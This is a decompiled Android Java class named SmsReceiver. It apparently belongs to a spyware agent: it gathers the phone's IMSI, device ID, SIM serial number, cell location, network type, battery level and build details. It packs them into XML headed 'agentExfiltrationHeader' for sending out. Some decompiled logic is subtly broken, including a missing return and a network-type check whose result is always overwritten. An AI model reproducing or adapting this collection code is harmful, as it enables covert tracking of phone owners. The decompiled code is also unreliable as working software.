package com.network.android;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import com.network.android.a.c;
import com.network.android.c.a.a;
import com.network.android.monitor.observer.BatteryReceiver;
import com.network.b.b;
import java.io.StringWriter;
import java.util.Timer;
import org.xml.sax.ContentHandler;
import org.xmlpull.v1.XmlSerializer;

public class SmsReceiver extends BroadcastReceiver {

    /* renamed from: a  reason: collision with root package name */
    public static String f40a = null;
    public static String b = null;
    public static Handler c;
    static Timer d = new Timer();
    private static TelephonyManager f;
    private static String g = null;
    ContentHandler e = new w();

    static {
        HandlerThread handlerThread = new HandlerThread("MainHandlerThread");
        handlerThread.start();
        c = new Handler(handlerThread.getLooper());
    }

    public static String a(Context context) {
        try {
            if (g != null) {
                return g;
            }
            if (f == null) {
                f = (TelephonyManager) context.getSystemService("phone");
            }
            String subscriberId = f.getSubscriberId();
            g = subscriberId;
            if (subscriberId == null || g.length() < 14 || g.length() > 15) {
                g = "000000000000000";
                return "000000000000000";
            }
            return g;
        } catch (Throwable th) {
            a.a("getIMSI Exception- " + th.getMessage(), th);
        }
    }

    public static void a(ContentResolver contentResolver, Context context) {
        c.post(new aa(context, contentResolver));
    }

    public static void a(Context context, XmlSerializer xmlSerializer, StringWriter stringWriter) {
        a(xmlSerializer);
        j.a(stringWriter.toString(), context);
        j.a(context);
    }

    public static void a(XmlSerializer xmlSerializer) {
        xmlSerializer.endTag("", "agentDataCollection");
        xmlSerializer.endDocument();
    }

    public static void a(XmlSerializer xmlSerializer, StringWriter stringWriter) {
        xmlSerializer.setOutput(stringWriter);
        xmlSerializer.startDocument("UTF-8", true);
        xmlSerializer.startTag("", "agentDataCollection");
    }

    public static void a(XmlSerializer xmlSerializer, StringWriter stringWriter, Context context) {
        String str;
        try {
            xmlSerializer.setOutput(stringWriter);
            xmlSerializer.startDocument("UTF-8", true);
            xmlSerializer.startTag("", "agentExfiltrationHeader");
            xmlSerializer.startTag("", "com");
            NetworkInfo[] allNetworkInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getAllNetworkInfo();
            int length = allNetworkInfo.length;
            int i = 0;
            while (true) {
                if (i >= length) {
                    break;
                }
                NetworkInfo networkInfo = allNetworkInfo[i];
                a.a("NetworkInfo: " + networkInfo.getTypeName() + ", connected: " + networkInfo.isConnected());
                if (!networkInfo.getTypeName().equalsIgnoreCase("WIFI") || !networkInfo.isConnected()) {
                    if (networkInfo.getTypeName().equalsIgnoreCase("MOBILE") && networkInfo.isConnected()) {
                        break;
                    }
                    i++;
                } else {
                    str = "wifi";
                    break;
                }
            }
            str = "3g";
            a.a("networkType: " + str);
            xmlSerializer.attribute("", "comMethod", str);
            xmlSerializer.endTag("", "com");
            xmlSerializer.startTag("", "protocol");
            xmlSerializer.attribute("", "version", "1");
            xmlSerializer.endTag("", "protocol");
            xmlSerializer.startTag("", "token");
            xmlSerializer.attribute("", "id", b(context));
            xmlSerializer.endTag("", "token");
            xmlSerializer.startTag("", "platformInfo");
            xmlSerializer.attribute("", "platform", "android");
            String str2 = Build.FINGERPRINT.split("/")[4].split(":")[0];
            xmlSerializer.attribute("", "rom", str2);
            a.a("fingerprint=" + str2);
            if (b.n == null) {
                try {
                    b.n = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
                } catch (Exception e2) {
                    b.n = "2.1111";
                }
            }
            xmlSerializer.attribute("", "aVersion", b.n);
            if (b.l != null) {
                xmlSerializer.attribute("", "pVersion", b.l);
            } else {
                xmlSerializer.attribute("", "pVersion", "0");
            }
            String a2 = BatteryReceiver.a(context);
            if (a2 != null && !a2.equals("")) {
                xmlSerializer.attribute("", "batteryLevel", a2);
            }
            f = (TelephonyManager) context.getSystemService("phone");
            xmlSerializer.attribute("", "nativeId", f.getDeviceId());
            xmlSerializer.attribute("", "imsi", a(context));
            xmlSerializer.attribute("", "model", Build.MODEL);
            xmlSerializer.attribute("", "manufacturer", Build.MANUFACTURER);
            a.a("MODEL: " + Build.DEVICE);
            xmlSerializer.attribute("", "osVersion", Build.VERSION.RELEASE);
            xmlSerializer.endTag("", "platformInfo");
            GsmCellLocation gsmCellLocation = (GsmCellLocation) f.getCellLocation();
            String networkOperator = f.getNetworkOperator();
            if (gsmCellLocation != null) {
                m.a(xmlSerializer, gsmCellLocation, networkOperator, f);
            }
            BootReceiver.f39a = f.getSimSerialNumber();
        } catch (Throwable th) {
            a.a("daump Exception- " + th.getMessage(), th);
        }
    }

    public static synchronized String b(Context context) {
        String str;
        synchronized (SmsReceiver.class) {
            try {
                if (b == null) {
                    b.d(context);
                }
            } catch (Throwable th) {
                a.a("getTokenId- " + th.getMessage(), th);
            }
            a.a("Token: " + b);
            str = b;
        }
        return str;
    }

    public static void b(XmlSerializer xmlSerializer) {
        xmlSerializer.endTag("", "agentExfiltrationHeader");
        xmlSerializer.endDocument();
    }

    public static String c(Context context) {
        f40a = b.a(context);
        a.a("getAgetAddress- " + f40a);
        return f40a;
    }

    public void onReceive(Context context, Intent intent) {
        a.a("SmsReceiver onReceive");
        c.j.post(new z(this, intent, context));
    }
}
